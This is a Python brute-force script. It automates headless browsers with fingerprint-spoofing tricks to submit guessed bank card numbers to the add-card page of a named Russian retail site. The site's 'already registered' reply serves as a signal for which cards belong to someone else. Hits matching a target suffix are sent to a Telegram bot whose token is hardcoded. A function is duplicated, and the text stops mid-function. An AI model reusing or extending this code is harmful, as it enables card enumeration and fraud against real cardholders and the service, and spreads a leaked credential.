import asyncio
import json
import logging
import os
import random
import re
import time
import httpx
from playwright.async_api import async_playwright

# ─── ЛОГИРОВАНИЕ ───────────────────────────────────────────────
logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("worker_manager")

# ─── КОНСТАНТЫ ─────────────────────────────────────────────────
ANTIDETECT_ARGS = [
    '--disable-blink-features=AutomationControlled', '--disable-automation', '--disable-infobars',
    '--disable-dev-shm-usage', '--disable-gpu', '--no-first-run', '--no-default-browser-check',
    '--no-sandbox', '--disable-notifications', '--disable-popup-blocking', '--disable-extensions',
    '--disable-background-networking', '--disable-background-timer-throttling', '--disable-sync',
    '--disable-logging', '--mute-audio', '--window-size=1920,1080', '--start-maximized',
    '--lang=ru-RU', '--disable-reading-from-canvas', '--disable-webgl', '--disable-webrtc',
]

ANTIDETECT_SCRIPTS = [
    "Object.defineProperty(navigator, 'webdriver', {get: () => undefined});",
    "Object.defineProperty(navigator, 'plugins', {get: () => [1,2,3,4,5]});",
    "Object.defineProperty(navigator, 'languages', {get: () => ['ru-RU','ru','en-US','en']});",
    "window.chrome = {runtime:{}, loadTimes:function(){}, csi:function(){}, app:{}};",
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
]

ADD_CARD_URL = 'https://vamprivet.ru/personal/add-card/'
AUTH_URL = 'https://vamprivet.ru/auth/'
BASE_DIR = '/root/brutv2'
PROFILES_DIR = os.path.join(BASE_DIR, 'profiles')
UPLOADS_DIR = os.path.join(BASE_DIR, 'uploads')
LAST_CHAT_FILE = os.path.join(BASE_DIR, 'last_chat_id.txt')
MONITOR_TASK_FILE = os.path.join(BASE_DIR, 'monitor_auth_task.json')
BRUT_TASK_FILE = os.path.join(BASE_DIR, 'brut_task.json')
STOP_FLAG_FILE = os.path.join(BASE_DIR, 'stop_brut.flag')

TELEGRAM_TOKEN = '8897765303:AAHZ-VfRAiSHshbmneLuCbbdl5exCPH1Xo4'
TELEGRAM_API = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}'

# ─── ГЛОБАЛЬНОЕ СОСТОЯНИЕ ────────────────────────────────────
telegram_client = None
worker_contexts = {}
worker_pages = {}
worker_tasks = []
monitor_contexts = []
monitor_pages = []
monitor_expire_time = 0
brut_running = False
stop_requested = False
processed_cards = set()
processed_lock = asyncio.Lock()
cards_queue = asyncio.Queue()
check_queue = asyncio.Queue()
result_lock = asyncio.Lock()

monitor_success = []
monitor_skip = []
monitor_fail = []
dropped_cards = []
final_card = None
monitor_success_found = False
monitor_success_card = None
total_processed = 0
total_cards = 0
progress_message_id = None

# Статистика для логирования
worker_success_cards = []
worker_skip_cards = []
worker_error_cards = []

# Данные мониторов для проверки
monitor_uuids = []
monitor_initial_data = []
monitor_data_lock = asyncio.Lock()

# Карты, уже отправленные в монитор
sent_to_monitor = set()
sent_to_monitor_lock = asyncio.Lock()

# Суффикс текущего брута (из первой карты файла)
current_suffix = None

# ═══════════════════════════════════════════════════════════════
#  НОВЫЕ ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ДЛЯ СРАВНЕНИЯ
# ═══════════════════════════════════════════════════════════════
initial_cards_data = None
initial_cards_lock = asyncio.Lock()
chat_id_global = None

# ─── ФУНКЦИЯ ДЛЯ ЛОГИРОВАНИЯ СОСТОЯНИЯ initial_cards_data ────
def log_initial_data_state(location: str):
    """Логирует текущее состояние initial_cards_data"""
    if initial_cards_data is None:
        logger.info(f"🔍 [{location}] initial_cards_data = None")
    elif isinstance(initial_cards_data, list):
        logger.info(f"🔍 [{location}] initial_cards_data = СПИСОК из {len(initial_cards_data)} элементов")
        if initial_cards_data:
            logger.info(f"🔍 [{location}] Первый элемент: {type(initial_cards_data[0])}")
            if isinstance(initial_cards_data[0], dict):
                logger.info(f"🔍 [{location}] Ключи первого элемента: {list(initial_cards_data[0].keys())}")
    elif isinstance(initial_cards_data, dict):
        data_keys = list(initial_cards_data.keys())
        logger.info(f"🔍 [{location}] initial_cards_data = СЛОВАРЬ, ключи: {data_keys}")
        if 'data' in initial_cards_data:
            cards = initial_cards_data.get('data', {}).get('cards', {})
            if isinstance(cards, dict):
                items = cards.get('items', [])
                logger.info(f"🔍 [{location}] В словаре {len(items)} карт")
            else:
                logger.info(f"🔍 [{location}] cards не словарь: {type(cards)}")
    else:
        logger.info(f"🔍 [{location}] initial_cards_data = {type(initial_cards_data)}")

# ═══════════════════════════════════════════════════════════════
#  TELEGRAM (async, non-blocking)
# ═══════════════════════════════════════════════════════════════
async def send_telegram(chat_id, text):
    try:
        await telegram_client.post(
            f'{TELEGRAM_API}/sendMessage',
            json={'chat_id': chat_id, 'text': text}
        )
        logger.info(f"📤 Telegram: {text[:100]}")
    except Exception as e:
        logger.error(f"❌ Ошибка Telegram: {e}")

async def send_progress(chat_id, text):
    global progress_message_id
    try:
        if progress_message_id:
            await telegram_client.post(
                f'{TELEGRAM_API}/editMessageText',
                json={'chat_id': chat_id, 'message_id': progress_message_id, 'text': text}
            )
        else:
            resp = await telegram_client.post(
                f'{TELEGRAM_API}/sendMessage',
                json={'chat_id': chat_id, 'text': text}
            )
            data = resp.json()
            if data.get('ok'):
                progress_message_id = data['result']['message_id']
    except Exception as e:
        logger.error(f"Ошибка прогресса: {e}")

def get_last_chat_id():
    try:
        with open(LAST_CHAT_FILE) as f:
            return f.read().strip()
    except:
        return None

# ═══════════════════════════════════════════════════════════════
#  PLAYWRIGHT УТИЛИТЫ
# ═══════════════════════════════════════════════════════════════
async def apply_antidetect(page):
    for script in ANTIDETECT_SCRIPTS:
        try:
            await page.evaluate(script)
        except:
            pass

async def wait_for_input(page, timeout=30):
    selectors = [
        '#addCard',
        'input[name="pan"]',
        'input[data-tid="addCard"]',
        'input[maxlength="19"]',
        'input[type="text"][placeholder*="карт"]',
        'input[placeholder*="номер карты"]'
    ]
    
    start = time.time()
    while time.time() - start < timeout:
        for sel in selectors:
            try:
                loc = page.locator(sel)
                if await loc.count() > 0:
                    is_visible = await loc.is_visible()
                    is_enabled = await loc.is_enabled()
                    if is_visible and is_enabled:
                        return loc
            except:
                continue
        await asyncio.sleep(0.5)
    
    try:
        inputs = await page.locator('input[type="text"], input[type="tel"]').all()
        for inp in inputs:
            if await inp.is_visible() and await inp.is_enabled():
                return inp
    except:
        pass
    
    return None

async def get_cards_list_via_fetch(page):
    try:
        result = await page.evaluate('''
            async () => {
                try {
                    const response = await fetch('/api/cards/', {
                        headers: { 'X-Requested-With': 'XMLHttpRequest' }
                    });
                    if (!response.ok) {
                        return { error: 'HTTP ' + response.status };
                    }
                    return await response.json();
                } catch(e) {
                    return { error: e.message };
                }
            }
        ''')
        
        if result and 'error' not in result:
            items = result.get('data', {}).get('cards', {}).get('items', [])
            logger.debug(f"✅ Получен список карт через fetch: {len(items)} карт")
            return result
        else:
            logger.warning(f"⚠️ Ошибка fetch: {result.get('error') if result else 'Unknown'}")
            return None
            
    except Exception as e:
        logger.error(f"❌ Ошибка в get_cards_list_via_fetch: {e}")
        return None

async def get_cards_list(page, retry=2):
    data = await get_cards_list_via_fetch(page)
    if data:
        return data
    
    for attempt in range(retry):
        try:
            async with page.expect_response(
                lambda r: '/api/cards/' in r.url and r.request.method == 'GET',
                timeout=15000
            ) as response_info:
                await page.reload(wait_until='domcontentloaded', timeout=30000)
                response = await response_info.value
                return await response.json()
        except Exception as e:
            logger.warning(f"⚠️ Попытка {attempt+1} получить список карт через перезагрузку не удалась: {e}")
            await asyncio.sleep(1)
    
    return None

# ═══════════════════════════════════════════════════════════════
#  ДОБАВЛЕНИЕ КАРТЫ
# ═══════════════════════════════════════════════════════════════
async def fill_and_submit_card(page, card):
    try:
        inp = await wait_for_input(page, timeout=30)
        if not inp:
            return None, "поле не найдено"
        
        for attempt in range(3):
            try:
                await page.fill('#addCard', '')
                await page.fill('#addCard', card)
                break
            except Exception as e:
                if attempt == 2:
                    return None, f"ошибка заполнения: {e}"
                await asyncio.sleep(1)
        
        await asyncio.sleep(1)
        
        btn = page.locator('button:has-text("Продолжить")')
        try:
            await btn.wait_for(state='visible', timeout=15000)
            for _ in range(30):
                if await btn.is_enabled():
                    break
                await asyncio.sleep(0.5)
        except:
            return None, "кнопка не найдена"
        
        if await btn.count() == 0 or not await btn.is_enabled():
            return None, "кнопка не активна"
        
        try:
            async with page.expect_response(
                lambda r: r.request.method == 'POST' and '/api/v3/add_card/' in r.url,
                timeout=15000
            ) as response_info:
                await btn.click(timeout=15000)
                response = await response_info.value
                api_data = await response.json()
                logger.debug(f"📡 API ответ: {api_data}")
                return api_data, None
        except asyncio.TimeoutError:
            return None, "таймаут API"
        except Exception as e:
            return None, f"ошибка API: {e}"
            
    except Exception as e:
        return None, str(e)

# ═══════════════════════════════════════════════════════════════
#  ВОРКЕРЫ
# ═══════════════════════════════════════════════════════════════
async def create_worker_context(worker_id):
    profile_dir = os.path.join(PROFILES_DIR, f'worker{worker_id}')
    if not os.path.exists(profile_dir):
        logger.warning(f"⚠️ Профиль worker{worker_id} не найден")
        return None, None
    logger.info(f"🔧 Запуск воркера {worker_id}...")
    try:
        ctx = await p.chromium.launch_persistent_context(
            user_data_dir=profile_dir, headless=True, viewport={'width':1920,'height':1080},
            user_agent=random.choice(USER_AGENTS), locale='ru-RU', timezone_id='Europe/Moscow',
            args=ANTIDETECT_ARGS
        )
        page = await ctx.new_page()
        await apply_antidetect(page)
        await page.goto(ADD_CARD_URL, wait_until='domcontentloaded', timeout=60000)
        await asyncio.sleep(3)
        inp = await wait_for_input(page, timeout=20)
        if inp:
            logger.info(f"✅ Воркер {worker_id} готов")
        else:
            logger.warning(f"⚠️ Воркер {worker_id}: поле не найдено")
        return ctx, page
    except Exception as e:
        logger.error(f"❌ Ошибка запуска воркера {worker_id}: {e}")
        return None, None

async def worker_try_add_card(page, card):
    try:
        if '/add-card' not in page.url:
            await page.goto(ADD_CARD_URL, wait_until='domcontentloaded', timeout=30000)
            await asyncio.sleep(2)
        
        api_data, error = await fill_and_submit_card(page, card)
        
        if api_data:
            if api_data.get('status_back', {}).get('appCode') == 'cardIsAlreadyRegistered':
                return 'skip'
            if api_data.get('success') is True:
                return 'success'
            return 'error'
        else:
            logger.warning(f"⚠️ Ошибка добавления: {error}")
            return 'error'
            
    except Exception as e:
        logger.error(f"❌ Ошибка в worker_try_add_card: {e}")
        return 'error'

async def worker_process_cards(wid, page, chat_id):
    global stop_requested, total_processed, final_card, monitor_success_found
    global worker_success_cards, worker_skip_cards, worker_error_cards
    
    try:
        success = 0
        skip = 0
        errors = 0

        logger.info(f"🔧 Воркер {wid}: начинаю обработку")

        while True:
            if stop_requested or monitor_success_found or final_card is not None:
                break
            
            try:
                card = await asyncio.wait_for(cards_queue.get(), timeout=2.0)
            except asyncio.TimeoutError:
                if cards_queue.empty():
                    break
                continue
            
            if stop_requested or monitor_success_found or final_card is not None:
                await cards_queue.put(card)
                break

            async with processed_lock:
                if card in processed_cards:
                    continue
                processed_cards.add(card)

            logger.debug(f"🔄 Воркер {wid}: обрабатываю карту {card}")
            
            result = None
            for attempt in range(3):
                if stop_requested or monitor_success_found or final_card is not None:
                    break
                
                if attempt > 0:
                    logger.debug(f"🔄 Воркер {wid}: перезагрузка перед попыткой {attempt+1}/3 для {card}")
                    await page.reload(wait_until='domcontentloaded', timeout=60000)
                    await asyncio.sleep(3)
                
                result = await worker_try_add_card(page, card)
                
                if result == 'skip':
                    skip += 1
                    worker_skip_cards.append(card)
                    logger.info(f"⏭️ Воркер {wid}: {card} уже есть (cardIsAlreadyRegistered) → монитору")
                    if final_card is None and not stop_requested and not monitor_success_found:
                        async with sent_to_monitor_lock:
                            if card not in sent_to_monitor:
                                sent_to_monitor.add(card)
                                await check_queue.put(card)
                    break
                    
                elif result == 'success':
                    success += 1
                    worker_success_cards.append(card)
                    logger.info(f"✅ Воркер {wid}: {card} добавилась в чужой аккаунт (игнорируем)")
                    break
                    
                else:
                    logger.warning(f"⚠️ Воркер {wid}: попытка {attempt+1}/3 для {card} не удалась")
                    if attempt == 2:
                        errors += 1
                        worker_error_cards.append(card)
                        await cards_queue.put_nowait(card)
                        logger.warning(f"🔄 Воркер {wid}: {card} возвращён в начало очереди после 3 неудач")
                    continue
            
            total_processed += 1
            if total_processed % 50 == 0:
                logger.info(f"📊 Прогресс: {total_processed}/{total_cards} (воркер {wid})")
                await send_progress(chat_id, f"📊 Прогресс: {total_processed}/{total_cards}")

    except asyncio.CancelledError:
        logger.info(f"⏹ Воркер {wid}: отменен")
        raise
    except Exception as e:
        logger.error(f"❌ Воркер {wid}: критическая ошибка: {e}")
    finally:
        logger.info(f"🏁 Воркер {wid}: завершено. Успех: {success}, skip: {skip}, ошибки: {errors}")

# ═══════════════════════════════════════════════════════════════
#  МОНИТОР
# ═══════════════════════════════════════════════════════════════
async def monitor_try_add_card(page, card):
    try:
        if '/add-card' not in page.url:
            await page.goto(ADD_CARD_URL, wait_until='domcontentloaded', timeout=30000)
            await asyncio.sleep(2)
        
        api_data, error = await fill_and_submit_card(page, card)
        
        if api_data:
            logger.info(f"📡 Монитор API ответ для {card}: {api_data}")
            if api_data.get('status_back', {}).get('appCode') == 'cardIsAlreadyRegistered':
                return 'skip', api_data
            if api_data.get('success') is True:
                return 'success', api_data
            return 'error', api_data
        else:
            logger.warning(f"⚠️ Монитор ошибка добавления: {error}")
            return 'error', None
            
    except Exception as e:
        logger.error(f"❌ Ошибка в monitor_try_add_card: {e}")
        return 'error', None

def ensure_initial_data_is_dict(data, location: str):
    """Приводит initial_cards_data к словарю, если это список"""
    global initial_cards_data
    
    if data is None:
        logger.warning(f"⚠️ [{location}] data is None")
        return data
    
    if isinstance(data, list):
        logger.warning(f"⚠️ [{location}] Обнаружен СПИСОК! Преобразую в словарь...")
        if data and isinstance(data[0], dict):
            converted = {
                'data': {
                    'cards': {
                        'items': data
                    }
                }
            }
            logger.info(f"✅ [{location}] Преобразовано в словарь с {len(converted['data']['cards']['items'])} картами")
            # Сохраняем в глобальную переменную
            initial_cards_data = converted
            return converted
        else:
            logger.error(f"❌ [{location}] Не удалось преобразовать список: элементы не словари")
            return data
    elif isinstance(data, dict):
        # Проверяем структуру
        if 'data' in data and 'cards' in data.get('data', {}):
            items = data.get('data', {}).get('cards', {}).get('items', [])
            logger.info(f"✅ [{location}] Данные уже словарь, {len(items)} карт")
            return data
        else:
            logger.warning(f"⚠️ [{location}] Словарь имеет неправильную структуру: {list(data.keys())}")
            # Пробуем восстановить
            if 'cards' in data:
                converted = {
                    'data': {
                        'cards': data
                    }
                }
                logger.info(f"✅ [{location}] Восстановлена структура из ключа 'cards'")
                initial_cards_data = converted
                return converted
            return data
    else:
        logger.error(f"❌ [{location}] Неизвестный тип: {type(data)}")
        return data

def compare_cards(api_data, initial_data, suffix):
    """
    Сравнивает текущий список карт с начальным.
    Возвращает: (success, card_number, diff_info)
    """
    global initial_cards_data
    
    # ✅ ПРОВЕРЯЕМ SUFFIX
    if suffix is None:
        logger.error(f"❌ compare_cards: suffix = None!")
        return False, None, "suffix is None"
    
    if not isinstance(suffix, str):
        logger.error(f"❌ compare_cards: suffix не строка: {type(suffix)}")
        return False, None, f"suffix не строка: {type(suffix)}"
    
    if not api_data or not initial_data:
        return False, None, "Нет данных для сравнения"
    
    # ✅ ПРИВОДИМ initial_data К СЛОВАРЮ
    if isinstance(initial_data, list):
        logger.warning(f"⚠️ compare_cards: initial_data это СПИСОК, преобразую в словарь")
        if initial_data and isinstance(initial_data[0], dict):
            initial_data = {
                'data': {
                    'cards': {
                        'items': initial_data
                    }
                }
            }
            initial_cards_data = initial_data
        else:
            return False, None, "initial_data список, но элементы не словари"
    
    if not isinstance(initial_data, dict):
        return False, None, "initial_data не словарь"
    
    if not isinstance(api_data, dict):
        return False, None, "api_data не словарь"
    
    # ✅ ПОЛУЧАЕМ КАРТЫ ИЗ API_DATA
    # ВНИМАНИЕ: api_data может иметь разную структуру!
    if 'data' not in api_data:
        return False, None, "api_data не содержит 'data'"
    
    data_obj = api_data['data']
    
    # ✅ api_data['data']['cards'] может быть СПИСКОМ или СЛОВАРЕМ
    if 'cards' not in data_obj:
        return False, None, "api_data не содержит 'data.cards'"
    
    cards_obj = data_obj['cards']
    
    # ✅ ЕСЛИ cards_obj - СПИСОК, используем его напрямую
    if isinstance(cards_obj, list):
        current_items = cards_obj
        logger.info(f"📊 api_data: cards_obj это СПИСОК из {len(current_items)} карт")
    # ✅ ЕСЛИ cards_obj - СЛОВАРЬ, ищем items
    elif isinstance(cards_obj, dict):
        current_items = cards_obj.get('items', [])
        logger.info(f"📊 api_data: cards_obj это СЛОВАРЬ, items: {len(current_items)} карт")
    else:
        return False, None, f"cards_obj неизвестного типа: {type(cards_obj)}"
    
    # ✅ ПОЛУЧАЕМ КАРТЫ ИЗ INITIAL_DATA
    if 'data' not in initial_data:
        return False, None, "initial_data не содержит 'data'"
    
    if 'cards' not in initial_data['data']:
        return False, None, "initial_data не содержит 'data.cards'"
    
    initial_cards_obj = initial_data['data']['cards']
    
    if isinstance(initial_cards_obj, list):
        initial_items = initial_cards_obj
        logger.info(f"📊 initial_data: cards_obj это СПИСОК из {len(initial_items)} карт")
    elif isinstance(initial_cards_obj, dict):
        initial_items = initial_cards_obj.get('items', [])
        logger.info(f"📊 initial_data: cards_obj это СЛОВАРЬ, items: {len(initial_items)} карт")
    else:
        return False, None, f"initial_cards_obj неизвестного типа: {type(initial_cards_obj)}"
    
    if not isinstance(current_items, list):
        return False, None, f"current_items не список: {type(current_items)}"
    
    if not isinstance(initial_items, list):
        return False, None, f"initial_items не список: {type(initial_items)}"
    
    # Находим карты с нужным суффиксом
    current_suffix_cards = []
    initial_suffix_cards = []
    
    for c in current_items:
        if isinstance(c, dict):
            number = c.get('number', '')
            if number and number.endswith(suffix):
                current_suffix_cards.append(c)
    
    for c in initial_items:
        if isinstance(c, dict):
            number = c.get('number', '')
            if number and number.endswith(suffix):
                initial_suffix_cards.append(c)
    
    logger.info(f"📊 compare_cards: было {len(initial_suffix_cards)} карт с суффиксом {suffix}, стало {len(current_suffix_cards)}")
    
    # Если количество не изменилось - успех!
    if len(current_suffix_cards) == len(initial_suffix_cards):
        if current_suffix_cards and initial_suffix_cards:
            current_sn = current_suffix_cards[0].get('sn')
            initial_sn = initial_suffix_cards[0].get('sn')
            if current_sn == initial_sn:
                logger.info(f"✅ compare_cards: УСПЕХ! Карта с суффиксом {suffix} не изменилась")
                return True, current_suffix_cards[0].get('number'), "Карта не изменилась"
            else:
                logger.info(f"⚠️ compare_cards: SN изменился: {initial_sn} -> {current_sn}")
                return False, None, "SN изменился"
        else:
            return False, None, "Нет карт с суффиксом"
    else:
        logger.info(f"⚠️ compare_cards: Появилась новая карта с суффиксом {suffix}")
        return False, None, "Появилась новая карта"
def ensure_initial_data_is_dict(data, location: str):
    """Приводит initial_cards_data к словарю, если это список"""
    global initial_cards_data
    
    if data is None:
        logger.warning(f"⚠️ [{location}] data is None")
        return data
    
    if isinstance(data, list):
        logger.warning(f"⚠️ [{location}] Обнаружен СПИСОК! Преобразую в словарь...")
        if data and isinstance(data[0], dict):
            converted = {
                'data': {
                    'cards': {
                        'items': data
                    }
                }
            }
            logger.info(f"✅ [{location}] Преобразовано в словарь с {len(converted['data']['cards']['items'])} картами")
            initial_cards_data = converted
            return converted
        else:
            logger.error(f"❌ [{location}] Не удалось преобразовать список: элементы не словари")
            return data
    elif isinstance(data, dict):
        if 'data' in data and 'cards' in data.get('data', {}):
            items = data.get('data', {}).get('cards', {}).get('items', [])
            logger.info(f"✅ [{location}] Данные уже словарь, {len(items)} карт")
            return data
        else:
            logger.warning(f"⚠️ [{location}] Словарь имеет неправильную структуру: {list(data.keys())}")
            if 'cards' in data:
                converted = {
                    'data': {
                        'cards': data
                    }
                }
                logger.info(f"✅ [{location}] Восстановлена структура из ключа 'cards'")
                initial_cards_data = converted
                return converted
            return data
    else:
        logger.error(f"❌ [{location}] Неизвестный тип: {type(data)}")
        return data
async def monitor_process(chat_id):
    global final_card, stop_requested, monitor_success, monitor_skip, monitor_fail
    global monitor_success_found, monitor_success_card, initial_cards_data
    
    # ✅ ЛОГИРУЕМ СОСТОЯНИЕ В НАЧАЛЕ
    log_initial_data_state("monitor_process START")
    
    # ✅ ПРИНУДИТЕЛЬНОЕ ПРЕОБРАЗОВАНИЕ В НАЧАЛЕ
    async with initial_cards_lock:
        if isinstance(initial_cards_data, list):
            logger.warning(f"⚠️ monitor_process: initial_cards_data это СПИСОК! Преобразую...")
            if initial_cards_data and isinstance(initial_cards_data[0], dict):
                initial_cards_data = {
                    'data': {
                        'cards': {
                            'items': initial_cards_data
                        }
                    }
                }
                logger.info(f"✅ monitor_process: Преобразовано в словарь с {len(initial_cards_data['data']['cards']['items'])} картами")
            else:
                logger.error(f"❌ monitor_process: Не удалось преобразовать список")
        elif isinstance(initial_cards_data, dict):
            items = initial_cards_data.get('data', {}).get('cards', {}).get('items', [])
            logger.info(f"✅ monitor_process: initial_cards_data уже словарь, {len(items)} карт")
        else:
            logger.warning(f"⚠️ monitor_process: initial_cards_data = {type(initial_cards_data)}")
    
    logger.info(f"📡 Монитор: запускаю проверку...")
    pages = monitor_pages
    if not pages:
        logger.error(f"❌ Монитор: нет готовых страниц (pages={len(pages)})")
        return

    page_locks = [asyncio.Lock() for _ in pages]
    tasks = set()
    page_index = 0
    monitor_success_found = False
    monitor_success_card = None
    monitor_stop = False

    async def check_on_page(page, lock, card, monitor_idx):
        global final_card, stop_requested, monitor_success, monitor_skip, monitor_fail
        global monitor_success_found, monitor_success_card, initial_cards_data
        
        try:
            logger.info(f"📡 Монитор: ЗАПУСК check_on_page для {card}, monitor_idx={monitor_idx}")
            
            if monitor_success_found or final_card is not None or stop_requested:
                return
                
            async with lock:
                if monitor_success_found or final_card is not None or stop_requested:
                    return
                    
                result, api_data = await monitor_try_add_card(page, card)
                
                if result == 'skip' or (api_data and api_data.get('status_back', {}).get('appCode') == 'cardIsAlreadyRegistered'):
                    monitor_skip.append(card)
                    logger.info(f"📡 Монитор: {card} уже есть в системе (cardIsAlreadyRegistered) → НЕ УСПЕХ")
                    return
                
                if result == 'success' and api_data and api_data.get('success') is True:
                    logger.info(f"📡 Монитор: {card} ДОБАВИЛАСЬ! Сравниваем с начальным списком...")
                    
                    async with monitor_data_lock:
                        if monitor_idx >= len(monitor_initial_data):
                            logger.warning(f"⚠️ Монитор: нет initial данных для {monitor_idx}")
                            monitor_fail.append(card)
                            return
                        
                        suffix = monitor_initial_data[monitor_idx]['suffix']
                        
                        # ✅ ПРОВЕРЯЕМ, ЧТО SUFFIX НЕ NONE
                        if suffix is None:
                            logger.error(f"❌ Монитор {monitor_idx}: suffix = None! Устанавливаю из current_suffix")
                            suffix = current_suffix
                            monitor_initial_data[monitor_idx]['suffix'] = suffix
                            logger.info(f"✅ Монитор {monitor_idx}: suffix установлен в {suffix}")
                        
                        # ✅ ПРОВЕРЯЕМ cards_data у конкретного монитора
                        cards_data = monitor_initial_data[monitor_idx].get('cards_data')
                        if isinstance(cards_data, list):
                            logger.warning(f"⚠️ Монитор {monitor_idx}: cards_data это СПИСОК! Преобразую...")
                            if cards_data and isinstance(cards_data[0], dict):
                                cards_data = {
                                    'data': {
                                        'cards': {
                                            'items': cards_data
                                        }
                                    }
                                }
                                monitor_initial_data[monitor_idx]['cards_data'] = cards_data
                                if monitor_idx == 0:
                                    async with initial_cards_lock:
                                        initial_cards_data = cards_data
                                        log_initial_data_state(f"monitor {monitor_idx} after fix")
                    
                    async with initial_cards_lock:
                        compare_data = initial_cards_data
                        log_initial_data_state(f"check_on_page before ensure")
                        compare_data = ensure_initial_data_is_dict(compare_data, f"check_on_page {card}")
                    
                    if compare_data is None:
                        logger.warning(f"⚠️ Монитор: нет initial_cards_data для сравнения")
                        monitor_fail.append(card)
                        return
                    
                    if not isinstance(compare_data, dict):
                        logger.error(f"❌ Монитор: compare_data не словарь: {type(compare_data)}")
                        monitor_fail.append(card)
                        return
                    
                    if 'data' not in compare_data:
                        logger.error(f"❌ Монитор: compare_data не содержит 'data': {list(compare_data.keys())}")
                        monitor_fail.append(card)
                        return
                    
                    if 'cards' not in compare_data.get('data', {}):
                        logger.error(f"❌ Монитор: compare_data не содержит 'data.cards': {list(compare_data.get('data', {}).keys())}")
                        monitor_fail.append(card)
                        return
                    
                    items = compare_data.get('data', {}).get('cards', {}).get('items', [])
                    logger.info(f"📊 Сравнение: начальный список содержит {len(items)} карт, suffix={suffix}")
                    
                    success, card_number, reason = compare_cards(api_data, compare_data, suffix)
                    
                    if success:
                        async with result_lock:
                            if not monitor_success_found and final_card is None:
                                monitor_success.append(card)
                                monitor_success_card = card
                                monitor_success_found = True
                                final_card = card
                                stop_requested = True
                                
                                logger.info(f"🎉🎉🎉 МОНИТОР НАШЕЛ УСПЕХ! Карта {card} - ИСКОМАЯ!")
                                logger.info(f"📊 Причина: {reason}")
                                await send_telegram(chat_id_global or get_last_chat_id() or '', f"🎉 УСПЕХ! Карта найдена монитором: {card}")
                                return
                    else:
                        logger.info(f"❌ Монитор: НЕ УСПЕХ для {card} ({reason})")
                        monitor_fail.append(card)
                        return
                
                monitor_fail.append(card)
                logger.info(f"📡 Монитор: {card} не удалось ({result})")
                
        except asyncio.CancelledError:
            logger.debug(f"📡 Монитор: задача для {card} отменена")
            raise
        except Exception as e:
            logger.error(f"📡 Монитор: ошибка в check_on_page для {card}: {e}")
            monitor_fail.append(card)

    logger.info(f"📡 Монитор: запускаю основной цикл (brut_running={brut_running})")
    while not stop_requested and not monitor_success_found and not monitor_stop:
        try:
            if monitor_success_found or final_card is not None:
                break
                
            try:
                card = await asyncio.wait_for(check_queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                if check_queue.empty() and not brut_running:
                    logger.info("📡 Монитор: очередь пуста, брут завершен, выхожу")
                    break
                continue
            except asyncio.CancelledError:
                logger.info("📡 Монитор: задача отменена")
                raise

            if card is None:
                logger.info("📡 Монитор: получен сигнал завершения")
                break
                
            if monitor_success_found or final_card is not None or stop_requested:
                break

            page_idx = page_index % len(pages)
            page = pages[page_idx]
            lock = page_locks[page_idx]
            page_index += 1
            
            logger.info(f"📡 Монитор: создаю задачу для {card} на странице {page_idx} (monitor_idx={page_idx})")

            t = asyncio.create_task(check_on_page(page, lock, card, page_idx))
            tasks.add(t)
            t.add_done_callback(tasks.discard)
            
        except asyncio.CancelledError:
            logger.info("📡 Монитор: основной цикл отменен")
            break
        except Exception as e:
            logger.error(f"📡 Монитор: ошибка в основном цикле: {e}")
            await asyncio.sleep(0.5)

    if tasks:
        logger.info(f"📡 Монитор: ожидаю завершения {len(tasks)} задач...")
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            logger.info("📡 Монитор: задачи отменены")
        except Exception as e:
            logger.error(f"📡 Монитор: ошибка при ожидании задач: {e}")

    logger.info(f"📡 Монитор: завершил. Успех: {len(monitor_success)}, skip: {len(monitor_skip)}, fail: {len(monitor_fail)}")
    if monitor_success_card:
        logger.info(f"🎉 Монитор: финальная успешная карта: {monitor_success_card}")
    else:
        logger.info(f"😔 Монитор: успех не найден")

# ═══════════════════════════════════════════════════════════════
#  ИНИЦИАЛИЗАЦИЯ ДАННЫХ МОНИТОРА
# ═══════════════════════════════════════════════════════════════
async def init_monitor_data_single(suffix):
    """
    Инициализирует данные монитора ОДИН РАЗ для всех мониторов.
    Использует данные из авторизации если они есть и корректны.
    Если данные приходят как список - преобразует в правильную структуру.
    """
    global initial_cards_data
    
    logger.info(f"📡 init_monitor_data_single: НАЧАЛО, suffix={suffix}")
    log_initial_data_state("init_monitor_data_single START")
    
    if not monitor_pages:
        logger.error("❌ Нет страниц мониторов")
        return False
    
    # ✅ УСТАНАВЛИВАЕМ SUFFIX ДЛЯ ВСЕХ МОНИТОРОВ
    async with monitor_data_lock:
        for i in range(len(monitor_initial_data)):
            monitor_initial_data[i]['suffix'] = suffix
        logger.info(f"✅ Установлен suffix={suffix} для всех {len(monitor_initial_data)} мониторов")
    
    # Пробуем использовать данные из авторизации
    async with monitor_data_lock:
        if monitor_initial_data and monitor_initial_data[0].get('cards_data'):
            cards_data = monitor_initial_data[0]['cards_data']
            
            logger.info(f"🔍 Тип cards_data: {type(cards_data)}")
            if isinstance(cards_data, dict):
                logger.info(f"🔍 Ключи cards_data: {list(cards_data.keys())}")
                if 'data' in cards_data:
                    data_obj = cards_data['data']
                    if 'cards' in data_obj:
                        cards_obj = data_obj['cards']
                        if isinstance(cards_obj, list):
                            logger.info(f"🔍 cards_obj это СПИСОК из {len(cards_obj)} карт")
                        elif isinstance(cards_obj, dict):
                            items = cards_obj.get('items', [])
                            logger.info(f"🔍 cards_obj это СЛОВАРЬ, items: {len(items)}")
            elif isinstance(cards_data, list):
                logger.info(f"🔍 cards_data это СПИСОК из {len(cards_data)} элементов")
                if cards_data:
                    logger.info(f"🔍 Первый элемент: {type(cards_data[0])}")
                    if isinstance(cards_data[0], dict):
                        logger.info(f"🔍 Ключи первого элемента: {list(cards_data[0].keys())}")
            
            # ✅ ПРИВОДИМ К ЕДИНОЙ СТРУКТУРЕ
            # Если cards_data - словарь с data.cards как список, преобразуем
            if isinstance(cards_data, dict) and 'data' in cards_data:
                data_obj = cards_data['data']
